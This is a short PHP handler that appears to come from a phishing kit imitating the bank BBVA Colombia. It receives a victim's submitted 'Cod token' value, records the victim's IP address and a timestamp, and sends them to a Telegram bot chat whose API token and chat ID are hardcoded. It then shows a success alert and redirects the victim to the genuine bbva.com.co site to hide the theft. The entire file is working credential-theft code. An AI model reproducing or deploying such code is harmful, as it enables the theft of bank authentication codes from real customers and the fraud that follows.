<?php
@ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
////////////////////
if ( isset ($_POST['numer'])){

$message = "Cod token: ".$_POST['numer']." - IP ".$userp." - Fecha: ".date('Y-m-d')." - ".date('H:i:s')."\r\n";

$apiToken = "7326449964:AAGcuAWx60RNunWrhzvLa-KSDYa9t9xWJOk";


$data = [
  'chat_id' => '-4242577870',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



echo '<script language="javascript">alert("¡Proceso culminado exitosamente!");</script>';
echo '<script type="text/javascript">window.location.href = "https://www.bbva.com.co/";</script>';
}else{ header ('location: index.html'); exit(); }
?>